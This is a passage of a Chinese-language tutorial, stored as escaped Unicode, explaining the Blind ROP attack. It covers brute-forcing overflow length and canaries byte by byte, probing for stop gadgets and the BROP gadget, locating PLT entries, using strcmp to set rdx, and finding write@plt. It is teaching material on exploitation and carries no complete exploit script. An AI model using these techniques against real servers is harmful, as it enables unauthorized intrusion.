OpenSSH\u7b49\u670d\u52a1\u5668\u5e94\u7528\u90fd\u662f\u7b26\u5408\u8fd9\u79cd\u7279\u6027\u7684\u3002\n\n\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u76ee\u524d\uff0c\u5927\u90e8\u5206\u5e94\u7528\u90fd\u4f1a\u5f00\u542fASLR\u3001NX\u3001Canary\u4fdd\u62a4\u3002\u8fd9\u91cc\u6211\u4eec\u5206\u522b\u8bb2\u89e3\u5728BROP\u4e2d\u5982\u4f55\u7ed5\u8fc7\u8fd9\u4e9b\u4fdd\u62a4\uff0c\u4ee5\u53ca\u5982\u4f55\u8fdb\u884c\u653b\u51fb\u3002\n\n\n\u57fa\u672c\u601d\u8def\n\n\n\u5728BROP\u4e2d\uff0c\u57fa\u672c\u7684\u9075\u5faa\u7684\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5224\u65ad\u6808\u6ea2\u51fa\u957f\u5ea6\n\n\n\u66b4\u529b\u679a\u4e3e\n\n\n\n\n\n\nStack Reading\n\n\n\u83b7\u53d6\u6808\u4e0a\u7684\u6570\u636e\u6765\u6cc4\u9732canaries\uff0c\u4ee5\u53caebp\u548c\u8fd4\u56de\u5730\u5740\u3002\n\n\n\n\n\n\nBind ROP\n\n\n\u627e\u5230\u8db3\u591f\u591a\u7684 gadgets \u6765\u63a7\u5236\u8f93\u51fa\u51fd\u6570\u7684\u53c2\u6570\uff0c\u5e76\u4e14\u5bf9\u5176\u8fdb\u884c\u8c03\u7528\uff0c\u6bd4\u5982\u8bf4\u5e38\u89c1\u7684 write \u51fd\u6570\u4ee5\u53caputs\u51fd\u6570\u3002\n\n\n\n\n\n\nBuild the exploit\n\n\n\u5229\u7528\u8f93\u51fa\u51fd\u6570\u6765 dump \u51fa\u7a0b\u5e8f\u4ee5\u4fbf\u4e8e\u6765\u627e\u5230\u66f4\u591a\u7684 gadgets\uff0c\u4ece\u800c\u53ef\u4ee5\u5199\u51fa\u6700\u540e\u7684 exploit\u3002\n\n\n\n\n\n\n\n\n\u6808\u6ea2\u51fa\u957f\u5ea6\n\n\n\u76f4\u63a5\u4ece1\u66b4\u529b\u679a\u4e3e\u5373\u53ef\uff0c\u76f4\u5230\u53d1\u73b0\u7a0b\u5e8f\u5d29\u6e83\u3002\n\n\nStack Reading\n\n\n\u5982\u4e0b\u6240\u793a\uff0c\u8fd9\u662f\u76ee\u524d\u7ecf\u5178\u7684\u6808\u5e03\u5c40\n\n\nbuffer|canary|saved fame pointer|saved returned address\n\n\n\n\n\u8981\u5411\u5f97\u5230canary\u4ee5\u53ca\u4e4b\u540e\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u9700\u8981\u89e3\u51b3\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u4f55\u5f97\u5230overflow\u7684\u957f\u5ea6\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7\u4e0d\u65ad\u5c1d\u8bd5\u6765\u83b7\u53d6\u3002\n\n\n\u5176\u6b21\uff0c\u5173\u4e8ecanary\u4ee5\u53ca\u540e\u9762\u7684\u53d8\u91cf\uff0c\u6240\u91c7\u7528\u7684\u7684\u65b9\u6cd5\u4e00\u81f4\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5canary\u4e3a\u4f8b\u3002\n\n\ncanary\u672c\u8eab\u53ef\u4ee5\u901a\u8fc7\u7206\u7834\u6765\u83b7\u53d6\uff0c\u4f46\u662f\u5982\u679c\u53ea\u662f\u611a\u8822\u5730\u679a\u4e3e\u6240\u6709\u7684\u6570\u503c\u7684\u8bdd\uff0c\u663e\u7136\u662f\u4f4e\u6548\u7684\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u653b\u51fb\u6761\u4ef62\u8868\u660e\u4e86\u7a0b\u5e8f\u672c\u8eab\u5e76\u4e0d\u4f1a\u56e0\u4e3acrash\u6709\u53d8\u5316\uff0c\u6240\u4ee5\u6bcf\u6b21\u7684canary\u7b49\u503c\u90fd\u662f\u4e00\u6837\u7684\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5b57\u8282\u8fdb\u884c\u7206\u7834\u3002\u6b63\u5982\u8bba\u6587\u4e2d\u6240\u5c55\u793a\u7684\uff0c\u6bcf\u4e2a\u5b57\u8282\u6700\u591a\u6709256\u79cd\u53ef\u80fd\uff0c\u6240\u4ee5\u572832\u4f4d\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6700\u591a\u9700\u8981\u7206\u78341024\u6b21\uff0c64\u4f4d\u6700\u591a\u7206\u78342048\u6b21\u3002\n\n\n\n\nBlind ROP\n\n\n\u57fa\u672c\u601d\u8def\n\n\n\u6700\u6734\u7d20\u7684\u6267\u884cwrite\u51fd\u6570\u7684\u65b9\u6cd5\u5c31\u662f\u6784\u9020\u7cfb\u7edf\u8c03\u7528\u3002\n\n\npop\n \nrdi\n; ret # socket\n\n\npop\n \nrsi\n; ret # buffer\n\n\npop\n \nrdx\n; ret # length\n\n\npop\n \nrax\n; ret # write syscall number\n\n\nsyscall\n\n\n\n\n\n\u4f46\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u6837\u7684\u65b9\u6cd5\u90fd\u662f\u6bd4\u8f83\u56f0\u96be\u7684\uff0c\u56e0\u4e3a\u60f3\u8981\u627e\u5230\u4e00\u4e2asyscall\u7684\u5730\u5740\u57fa\u672c\u4e0d\u53ef\u80fd\u3002\u3002\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8f6c\u6362\u4e3a\u627ewrite\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u3002\n\n\nBROP gadgets\n\n\n\u9996\u5148\uff0c\u5728libc_csu_init\u7684\u7ed3\u5c3e\u4e00\u957f\u4e32\u7684gadgets\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u504f\u79fb\u6765\u83b7\u53d6write\u51fd\u6570\u8c03\u7528\u7684\u524d\u4e24\u4e2a\u53c2\u6570\u3002\u6b63\u5982\u6587\u4e2d\u6240\u5c55\u793a\u7684\n\n\n\n\nfind a call write\n\n\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7plt\u8868\u6765\u83b7\u53d6write\u7684\u5730\u5740\u3002\n\n\ncontrol rdx\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0crdx\u53ea\u662f\u6211\u4eec\u7528\u6765\u8f93\u51fa\u7a0b\u5e8f\u5b57\u8282\u957f\u5ea6\u7684\u53d8\u91cf\uff0c\u53ea\u8981\u4e0d\u4e3a0\u5373\u53ef\u3002\u4e00\u822c\u6765\u8bf4\u7a0b\u5e8f\u4e2d\u7684rdx\u7ecf\u5e38\u6027\u4f1a\u4e0d\u662f\u96f6\u3002\u4f46\u662f\u4e3a\u4e86\u66f4\u597d\u5730\u63a7\u5236\u7a0b\u5e8f\u8f93\u51fa\uff0c\u6211\u4eec\u4ecd\u7136\u5c3d\u91cf\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e2a\u503c\u3002\u4f46\u662f\uff0c\u5728\u7a0b\u5e8f\n\n\npop\n \nrdx\n; ret\n\n\n\n\n\n\u8fd9\u6837\u7684\u6307\u4ee4\u51e0\u4e4e\u6ca1\u6709\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u63a7\u5236rdx\u7684\u6570\u503c\u5462\uff1f\u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u6267\u884cstrcmp\u7684\u65f6\u5019\uff0crdx\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u5c06\u8981\u88ab\u6bd4\u8f83\u7684\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u627e\u5230strcmp\u51fd\u6570\uff0c\u4ece\u800c\u6765\u63a7\u5236rdx\u3002\n\n\n\u90a3\u4e48\u63a5\u4e0b\u6765\u7684\u95ee\u9898\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5206\u4e3a\u4e24\u9879\n\n\n\n\n\u5bfb\u627egadgets\n\n\n\u5bfb\u627ePLT\u8868\n\n\nwrite\u5165\u53e3\n\n\nstrcmp\u5165\u53e3\n\n\n\n\n\n\n\n\n\u5bfb\u627egadgets\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u6765\u60f3\u529e\u6cd5\u5bfb\u627egadgets\u3002\u6b64\u65f6\uff0c\u7531\u4e8e\u5c1a\u672a\u77e5\u9053\u7a0b\u5e8f\u5177\u4f53\u957f\u4ec0\u4e48\u6837\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u901a\u8fc7\u7b80\u5355\u7684\u63a7\u5236\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u81ea\u5df1\u8bbe\u7f6e\u7684\u503c\uff0c\u4ece\u800c\u800c\u6765\u731c\u6d4b\u76f8\u5e94\u7684gadgets\u3002\u800c\u5f53\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u65f6\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\n\n\n\n\n\u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83\n\n\n\u7a0b\u5e8f\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\u540e\u5d29\u6e83\n\n\n\u7a0b\u5e8f\u4e00\u76f4\u8fd0\u884c\u800c\u5e76\u4e0d\u5d29\u6e83\n\n\n\n\n\u4e3a\u4e86\u5bfb\u627e\u5408\u7406\u7684gadgets\uff0c\u6211\u4eec\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e24\u6b65\n\n\n\u5bfb\u627estop gadgets\n\n\n\u6240\u8c13\nstop gadget\n\u4e00\u822c\u6307\u7684\u662f\u8fd9\u6837\u4e00\u6bb5\u4ee3\u7801\uff1a\u5f53\u7a0b\u5e8f\u7684\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8fdb\u5165\u65e0\u9650\u5faa\u73af\uff0c\u8fd9\u6837\u4f7f\u5f97\u653b\u51fb\u8005\u80fd\u591f\u4e00\u76f4\u4fdd\u6301\u8fde\u63a5\u72b6\u6001\u3002\n\n\n\n\n\u5176\u5b9estop gadget\u4e5f\u5e76\u4e0d\u4e00\u5b9a\u5f97\u662f\u4e0a\u9762\u7684\u6837\u5b50\uff0c\u5176\u6839\u672c\u7684\u76ee\u7684\u5728\u4e8e\u544a\u8bc9\u653b\u51fb\u8005\uff0c\u6240\u6d4b\u8bd5\u7684\u8fd4\u56de\u5730\u5740\u662f\u4e00\u4e2agadgets\u3002\n\n\n\n\n\u4e4b\u6240\u4ee5\u8981\u5bfb\u627estop gadgets\uff0c\u662f\u56e0\u4e3a\u5f53\u6211\u4eec\u731c\u5230\u67d0\u4e2agadgtes\u540e\uff0c\u5982\u679c\u6211\u4eec\u4ec5\u4ec5\u662f\u5c06\u5176\u5e03\u7f6e\u5728\u6808\u4e0a\uff0c\u7531\u4e8e\u6267\u884c\u5b8c\u8fd9\u4e2agadget\u4e4b\u540e\uff0c\u7a0b\u5e8f\u8fd8\u4f1a\u8df3\u5230\u6808\u4e0a\u7684\u4e0b\u4e00\u4e2a\u5730\u5740\u3002\u5982\u679c\u8be5\u5730\u5740\u662f\u975e\u6cd5\u5730\u5740\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1acrash\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5728\u653b\u51fb\u8005\u770b\u6765\u7a0b\u5e8f\u53ea\u662f\u5355\u7eaf\u7684crash\u4e86\u3002\u56e0\u6b64\uff0c\u653b\u51fb\u8005\u5c31\u4f1a\u8ba4\u4e3a\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5e76\u6ca1\u6709\u6267\u884c\u5230\u4efb\u4f55\u7684\nuseful gadget\n\uff0c\u4ece\u800c\u653e\u5f03\u5b83\u3002\u4f8b\u5b50\u5982\u4e0b\u56fe\n\n\n\n\n\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u5e03\u7f6e\u4e86\nstop gadget\n\uff0c\u90a3\u4e48\u5bf9\u4e8e\u6211\u4eec\u6240\u8981\u5c1d\u8bd5\u7684\u6bcf\u4e00\u4e2a\u5730\u5740\uff0c\u5982\u679c\u5b83\u662f\u4e00\u4e2agadget\u7684\u8bdd\uff0c\u90a3\u4e48\u7a0b\u5e8f\u4e0d\u4f1a\u5d29\u6e83\u3002\u63a5\u4e0b\u6765\uff0c\u5c31\u662f\u53bb\u60f3\u529e\u6cd5\u8bc6\u522b\u8fd9\u4e9bgadget\u3002\n\n\n\u8bc6\u522b gadgets\n\n\n\u90a3\u4e48\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u8bc6\u522b\u8fd9\u4e9bgadgets\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6808\u5e03\u5c40\u4ee5\u53ca\u7a0b\u5e8f\u7684\u884c\u4e3a\u6765\u8fdb\u884c\u8bc6\u522b\u3002\u4e3a\u4e86\u66f4\u52a0\u5bb9\u6613\u5730\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u5b9a\u4e49\u6808\u4e0a\u7684\u4e09\u79cd\u5730\u5740\n\n\n\n\nProbe\n\n\n\u63a2\u9488\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u60f3\u8981\u63a2\u6d4b\u7684\u4ee3\u7801\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u90fd\u662f64\u4f4d\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u76f4\u63a5\u4ece0x400000\u5c1d\u8bd5\uff0c\u5982\u679c\u4e0d\u6210\u529f\uff0c\u6709\u53ef\u80fd\u7a0b\u5e8f\u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u518d\u4e0d\u6d4e\uff0c\u5c31\u53ef\u80fd\u662f\u7a0b\u5e8f\u662f32\u4f4d\u4e86\u3002\u3002\u8fd9\u91cc\u6211\u8fd8\u6ca1\u6709\u7279\u522b\u60f3\u660e\u767d\uff0c\u600e\u4e48\u53ef\u4ee5\u5feb\u901f\u786e\u5b9a\u8fdc\u7a0b\u7684\u4f4d\u6570\u3002\n\n\n\n\n\n\nStop\n\n\n\u4e0d\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u7684stop gadget\u7684\u5730\u5740\u3002\n\n\n\n\n\n\nTrap\n\n\n\u53ef\u4ee5\u5bfc\u81f4\u7a0b\u5e8f\u5d29\u6e83\u7684\u5730\u5740\n\n\n\n\n\n\n\n\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728\u6808\u4e0a\u6446\u653e\u4e0d\u540c\u987a\u5e8f\u7684\nStop\n\u4e0e \nTrap\n\u4ece\u800c\u6765\u8bc6\u522b\u51fa\u6b63\u5728\u6267\u884c\u7684\u6307\u4ee4\u3002\u56e0\u4e3a\u6267\u884cStop\u610f\u5473\u7740\u7a0b\u5e8f\u4e0d\u4f1a\u5d29\u6e83\uff0c\u6267\u884cTrap\u610f\u5473\u7740\u7a0b\u5e8f\u4f1a\u7acb\u5373\u5d29\u6e83\u3002\u8fd9\u91cc\u7ed9\u51fa\u51e0\u4e2a\u4f8b\u5b50\n\n\n\n\nprobe,stop,traps(traps,traps,...)\n\n\n\u6211\u4eec\u901a\u8fc7\u7a0b\u5e8f\u5d29\u6e83\u4e0e\u5426(\n\u5982\u679c\u7a0b\u5e8f\u5728probe\u5904\u76f4\u63a5\u5d29\u6e83\u600e\u4e48\u5224\u65ad\n)\u53ef\u4ee5\u627e\u5230\u4e0d\u4f1a\u5bf9\u6808\u8fdb\u884cpop\u64cd\u4f5c\u7684gadget\uff0c\u5982\n\n\nret\n\n\nxor eax,eax; ret\n\n\n\n\n\n\n\n\n\n\nprobe,trap,stop,traps\n\n\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u5e03\u5c40\u627e\u5230\u53ea\u662f\u5f39\u51fa\u4e00\u4e2a\u6808\u53d8\u91cf\u7684gadget\u3002\u5982\n\n\npop rax; ret\n\n\npop rdi; ret\n\n\n\n\n\n\n\n\n\n\nprobe, trap, trap, trap, trap, trap, trap, stop, traps\n\n\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u5e03\u5c40\u6765\u627e\u5230\u5f39\u51fa6\u4e2a\u6808\u53d8\u91cf\u7684gadget\uff0c\u4e5f\u5c31\u662f\u4e0ebrop gadget\u76f8\u4f3c\u7684gadget\u3002\n\u8fd9\u91cc\u611f\u89c9\u539f\u6587\u662f\u6709\u95ee\u9898\u7684\uff0c\u6bd4\u5982\u8bf4\u5982\u679c\u9047\u5230\u4e86\u53ea\u662fpop\u4e00\u4e2a\u6808\u53d8\u91cf\u7684\u5730\u5740\uff0c\u5176\u5b9e\u4e5f\u662f\u4e0d\u4f1a\u5d29\u6e83\u7684\uff0c\uff0c\n\u8fd9\u91cc\u4e00\u822c\u6765\u8bf4\u4f1a\u9047\u5230\u4e24\u5904\u6bd4\u8f83\u6709\u610f\u601d\u7684\u5730\u65b9\n\n\nplt\u5904\u4e0d\u4f1a\u5d29\uff0c\uff0c\n\n\n_start\u5904\u4e0d\u4f1a\u5d29\uff0c\u76f8\u5f53\u4e8e\u7a0b\u5e8f\u91cd\u65b0\u6267\u884c\u3002\n\n\n\n\n\n\n\n\n\n\n\n\n\u4e4b\u6240\u4ee5\u8981\u5728\u6bcf\u4e2a\u5e03\u5c40\u7684\u540e\u9762\u90fd\u653e\u4e0atrap\uff0c\u662f\u4e3a\u4e86\u80fd\u591f\u8bc6\u522b\u51fa\uff0c\u5f53\u6211\u4eec\u7684probe\u5904\u5bf9\u5e94\u7684\u5730\u5740\u6267\u884c\u7684\u6307\u4ee4\u8df3\u8fc7\u4e86stop\uff0c\u7a0b\u5e8f\u7acb\u9a6c\u5d29\u6e83\u7684\u884c\u4e3a\u3002\n\n\n\u4f46\u662f\uff0c\u5373\u4f7f\u662f\u8fd9\u6837\uff0c\u6211\u4eec\u4ecd\u7136\u96be\u4ee5\u8bc6\u522b\u51fa\u6b63\u5728\u6267\u884c\u7684gadget\u5230\u5e95\u662f\u5728\u5bf9\u54ea\u4e2a\u5bc4\u5b58\u5668\u8fdb\u884c\u64cd\u4f5c\u3002\n\n\n\u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u5411BROP\u8fd9\u6837\u7684\u4e00\u4e0b\u5b50\u5f39\u51fa6\u4e2a\u5bc4\u5b58\u5668\u7684gadgets\uff0c\u7a0b\u5e8f\u4e2d\u5e76\u4e0d\u7ecf\u5e38\u51fa\u73b0\u3002\u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u53d1\u73b0\u4e86\u8fd9\u6837\u7684gadgets\uff0c\u90a3\u4e48\uff0c\u6709\u5f88\u5927\u7684\u53ef\u80fd\u6027\uff0c\u8fd9\u4e2agadgets\u5c31\u662fbrop gadgets\u3002\u6b64\u5916\uff0c\u8fd9\u4e2agadgets\u901a\u8fc7\u9519\u4f4d\u8fd8\u53ef\u4ee5\u751f\u6210pop rsp\u7b49\u8fd9\u6837\u7684gadgets\uff0c\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u8bc6\u522b\u8fd9\u4e2agadgets\u7684\u6807\u5fd7\u3002\n\n\n\u6b64\u5916\uff0c\u6839\u636e\u6211\u4eec\u4e4b\u524d\u5b66\u7684ret2libc_csu_init\u53ef\u4ee5\u77e5\u9053\u8be5\u5730\u5740\u51cf\u53bb0x1a\u5c31\u4f1a\u5f97\u5230\u5176\u4e0a\u4e00\u4e2agadgets\u3002\u53ef\u4ee5\u4f9b\u6211\u4eec\u8c03\u7528\u5176\u5b83\u51fd\u6570\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662fprobe\u53ef\u80fd\u662f\u4e00\u4e2astop gadget\uff0c\u6211\u4eec\u5f97\u53bb\u68c0\u67e5\u4e00\u4e0b\uff0c\u600e\u4e48\u68c0\u67e5\u5462\uff1f\u6211\u4eec\u53ea\u9700\u8981\u8ba9\u540e\u9762\u6240\u6709\u7684\u5185\u5bb9\u53d8\u4e3atrap\u5730\u5740\u5373\u53ef\u3002\u56e0\u4e3a\u5982\u679c\u662fstop gadget\u7684\u8bdd\uff0c\u7a0b\u5e8f\u4f1a\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u5c31\u4f1a\u5d29\u6e83\u3002\u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6709\u610f\u601d.\n\n\n\u5bfb\u627ePLT\n\n\n\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u7a0b\u5e8f\u7684plt\u8868\u5177\u6709\u6bd4\u8f83\u89c4\u6574\u7684\u7ed3\u6784\uff0c\u6bcf\u4e00\u4e2aplt\u8868\u9879\u90fd\u662f16\u5b57\u8282\u3002\u800c\u4e14\uff0c\u5728\u6bcf\u4e00\u4e2a\u8868\u9879\u76846\u5b57\u8282\u504f\u79fb\u5904\uff0c\u662f\u8be5\u8868\u9879\u5bf9\u5e94\u7684\u51fd\u6570\u7684\u89e3\u6790\u8def\u5f84\uff0c\u5373\u7a0b\u5e8f\u6700\u521d\u6267\u884c\u8be5\u51fd\u6570\u7684\u65f6\u5019\uff0c\u4f1a\u6267\u884c\u8be5\u8def\u5f84\u5bf9\u51fd\u6570\u7684got\u5730\u5740\u8fdb\u884c\u89e3\u6790\u3002 \n\n\n\n\n\u6b64\u5916\uff0c\u5bf9\u4e8e\u5927\u591a\u6570plt\u8c03\u7528\u6765\u8bf4\uff0c\u4e00\u822c\u90fd\u4e0d\u5bb9\u6613\u5d29\u6e83\uff0c\u5373\u4f7f\u662f\u4f7f\u7528\u4e86\u6bd4\u8f83\u5947\u602a\u7684\u53c2\u6570\u3002\u6240\u4ee5\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u7cfb\u5217\u7684\u957f\u5ea6\u4e3a16\u7684\u6ca1\u6709\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u7684\u4ee3\u7801\u6bb5\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u4e00\u5b9a\u7684\u7406\u7531\u76f8\u4fe1\u6211\u4eec\u9047\u5230\u4e86plt\u8868\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u524d\u540e\u504f\u79fb6\u5b57\u8282\uff0c\u6765\u5224\u65ad\u6211\u4eec\u662f\u5904\u4e8eplt\u8868\u9879\u4e2d\u95f4\u8fd8\u662f\u8bf4\u5904\u4e8e\u5f00\u5934\u3002\n\n\n\u63a7\u5236rdx\n\n\n\u5f53\u6211\u4eec\u627e\u5230plt\u8868\u4e4b\u540e\uff0c\u4e0b\u9762\uff0c\u6211\u4eec\u5c31\u8be5\u60f3\u529e\u6cd5\u6765\u63a7\u5236rdx\u7684\u6570\u503c\u4e86\uff0c\u90a3\u4e48\u8be5\u5982\u4f55\u786e\u8ba4strcmp\u7684\u4f4d\u7f6e\u5462\uff1f\u9700\u8981\u63d0\u524d\u8bf4\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528strcmp\u51fd\u6570\uff0c\u6240\u4ee5\u5728\u6ca1\u6709\u8c03\u7528strcmp\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5c31\u5f97\u5229\u7528\u5176\u5b83\u65b9\u5f0f\u6765\u63a7\u5236rdx\u7684\u503c\u4e86\u3002\u8fd9\u91cc\u7ed9\u51fa\u7a0b\u5e8f\u4e2d\u4f7f\u7528strcmp\u51fd\u6570\u7684\u60c5\u51b5\u3002\n\n\n\u4e4b\u524d\uff0c\u6211\u4eec\u5df2\u7ecf\u627e\u5230\u4e86brop\u7684gadgets\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u51fd\u6570\u7684\u524d\u4e24\u4e2a\u53c2\u6570\u4e86\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u5b9a\u4e49\u4ee5\u4e0b\u4e24\u79cd\u5730\u5740\n\n\n\n\nreadable\uff0c\u53ef\u8bfb\u7684\u5730\u5740\u3002\n\n\nbad, \u975e\u6cd5\u5730\u5740\uff0c\u4e0d\u53ef\u8bbf\u95ee\uff0c\u6bd4\u5982\u8bf40x0\u3002\n\n\n\n\n\u90a3\u4e48\u6211\u4eec\u5982\u679c\u63a7\u5236\u4f20\u9012\u7684\u53c2\u6570\u4e3a\u8fd9\u4e24\u79cd\u5730\u5740\u7684\u7ec4\u5408\uff0c\u4f1a\u51fa\u73b0\u4ee5\u4e0b\u56db\u79cd\u60c5\u51b5\n\n\n\n\nstrcmp(bad,bad)\n\n\nstrcmp(bad,readable)\n\n\nstrcmp(readable,bad)\n\n\nstrcmp(readable,readable)\n\n\n\n\n\u53ea\u6709\u6700\u540e\u4e00\u79cd\u683c\u5f0f\uff0c\u7a0b\u5e8f\u624d\u4f1a\u6b63\u5e38\u6267\u884c\u3002\n\n\n\u6ce8\n\uff1a\u5728\u6ca1\u6709PIE\u4fdd\u62a4\u7684\u65f6\u5019\uff0c64\u4f4d\u7a0b\u5e8f\u7684ELF\u6587\u4ef6\u76840x400000\u5904\u67097\u4e2a\u975e\u96f6\u5b57\u8282\u3002\n\n\n\u90a3\u4e48\u6211\u4eec\u8be5\u5982\u4f55\u5177\u4f53\u5730\u53bb\u505a\u5462\uff1f\u6709\u4e00\u79cd\u6bd4\u8f83\u76f4\u63a5\u7684\u65b9\u6cd5\u5c31\u662f\u4ece\u5934\u5230\u5c3e\u4f9d\u6b21\u626b\u63cf\u6bcf\u4e2aplt\u8868\u9879\uff0c\u4f46\u662f\u8fd9\u4e2a\u5374\u6bd4\u8f83\u9ebb\u70e6\u3002\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u5982\u4e0b\u7684\u4e00\u79cd\u65b9\u6cd5\n\n\n\n\n\u5229\u7528plt\u8868\u9879\u7684\u6162\u8def\u5f84\n\n\n\u5e76\u4e14\u5229\u7528\u4e0b\u4e00\u4e2a\u8868\u9879\u7684\u6162\u8def\u5f84\u7684\u5730\u5740\u6765\u8986\u76d6\u8fd4\u56de\u5730\u5740\n\n\n\n\n\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u4e0d\u7528\u6765\u56de\u63a7\u5236\u76f8\u5e94\u7684\u53d8\u91cf\u4e86\u3002 \n\n\n\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u80fd\u78b0\u5de7\u627e\u5230strncmp\u6216\u8005strcasecmp\u51fd\u6570\uff0c\u5b83\u4eec\u5177\u6709\u548cstrcmp\u4e00\u6837\u7684\u6548\u679c\u3002\n\n\n\u5bfb\u627e\u8f93\u51fa\u51fd\u6570\n\n\n\u5bfb\u627e\u8f93\u51fa\u51fd\u6570\u65e2\u53ef\u4ee5\u5bfb\u627ewrite\uff0c\u4e5f\u53ef\u4ee5\u5bfb\u627eputs\u3002\u4e00\u822c\u73b0\u5148\u627eputs\u51fd\u6570\u3002\u4e0d\u8fc7\u8fd9\u91cc\u4e3a\u4e86\u4ecb\u7ecd\u65b9\u4fbf\uff0c\u5148\u4ecb\u7ecd\u5982\u4f55\u5bfb\u627ewrite\u3002\n\n\n\u5bfb\u627ewrite@plt\n\n\n\u5f53\u6211\u4eec\u53ef\u4ee5\u63a7\u5236write\u51fd\u6570\u7684\u4e09\u4e2a\u53c2\u6570\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u518d\u6b21\u904d\u5386\u6240\u6709\u7684plt\u8868\uff0c\u6839\u636ewrite\u51fd\u6570\u5c06\u4f1a\u8f93\u51fa\u5185\u5bb9\u6765\u627e\u5230\u5bf9\u5e94\u7684\u51fd\u6570\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6709\u4e2a\u6bd4\u8f83\u9ebb\u70e6\u7684\u5730\u65b9\u5728\u4e8e\u6211\u4eec\u9700\u8981\u627e\u5230\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u503c\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6709\u4e24\u79cd\u65b9\u6cd5\u6765\u627e\u5230\u8fd9\u4e2a\u503c\n\n\n\n\n\u4f7f\u7528rop 